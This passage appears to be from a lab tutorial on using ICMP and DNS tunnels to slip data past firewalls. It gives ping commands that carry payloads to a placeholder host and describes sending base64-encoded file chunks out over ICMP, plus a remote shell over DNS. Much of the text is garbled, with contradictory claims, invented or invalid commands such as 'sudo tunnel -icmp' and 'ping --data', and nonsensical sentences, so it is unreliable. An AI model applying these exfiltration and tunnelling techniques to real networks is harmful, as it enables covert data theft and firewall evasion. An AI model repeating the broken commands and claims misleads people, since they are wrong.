    \ to receive ICMP packets of ping from your host (otherwise ICMP tunneling won't\
    \ work) and send ICMP packets of ping to your VM.\n\nAs long as there is a single\
    \ outbound packet ping flowing from your network, you can carry data through -\
    \ even when the packet appears to be harmless as an ICMP packet. System administrators\
    \ set up their firewalls to block ICMP echo-request, after ICMP packets of type\
    \ 0 (echo-reply).\n\nWrong. ICMP packet can carry arbitrary data, and you can\
    \ use ICMP to bypass firewalls and obfuscate traffic. This strategy is common\
    \ for DNS: for DNS and networks, you can exfiltrate data using DNS protocol over\
    \ UDP. If appropriate, you might be able to spawn a remote shell by encapsulating\
    \ it through a DNS tunnel! For example, using the following tools and techniques\
    \ which are exclusive to pen-testing and ethical hacking, you use ICMP and DNS\
    \ tunnels to get your packets of obfuscation.\n\n```\nsudo tunnel -icmp vboxnet0\
    \ -x\n> <VMIP> and src host <VMIP>\n```\n\nOn your VM, open a terminal and send\
    \ one ICMP request to your host carrying the 'deadbeef' payload with the old-school\
    \ ping command and its -p flag (replace with your IP address):\n\n```\nping -c\
    \ 1 -p deadbeef <HOSTIP>\n```\n\nBack to why you used the 'deadbeef' payload.\
    \ According to the ping page (see man page), you can specify up to 16 bytes to\
    \ fill the payload. We've seen that 'deadbeef' works once. So, how can we exfiltrate\
    \ 'deadbeef' using just the ping command? Oh, that's not very useful. We can do\
    \ better. First, install nmap on your VM with `sudo install nmap`. Then exfiltrate\
    \ from the VM this time using ping, a utility with tcpdump running on your computer.\n\
    \n```\nsudo ping -c 1 <HOSTIP> --data \"Hi\"\n```\n\nThe message will be clearly\
    \ on your tcpdump: ping is great, but it's hard to find a way. If you want to\
    \ exfiltrate privileges, you won't be able to survive it. But you don't need to\
    \ worry because it's a SETUID binary anyway. It's a bit annoying however, that\
    \ you can only send to 16 bytes per packet (the max size). But filling the payload\
    \ of each packet will help you overcome this limitation. You will then find files\
    \ over the icmp-client and icmp-server is a simple Bash script that uses the ping\
    \ command and is fast to shift in chunks up to 16. Use ICMP and DNS tunnels to\
    \ guide your packets degree of obfuscation. Base64-encoded bytes from a file that\
    \ you downloaded. The server is a simple and relatively unpublished script (see\
    \ https://github.com/scapy/scapy) to icmp-echo-request received and stores them\
    \ in memory. The client will exfiltrate a special packet with the 'deadbeef' payload,\
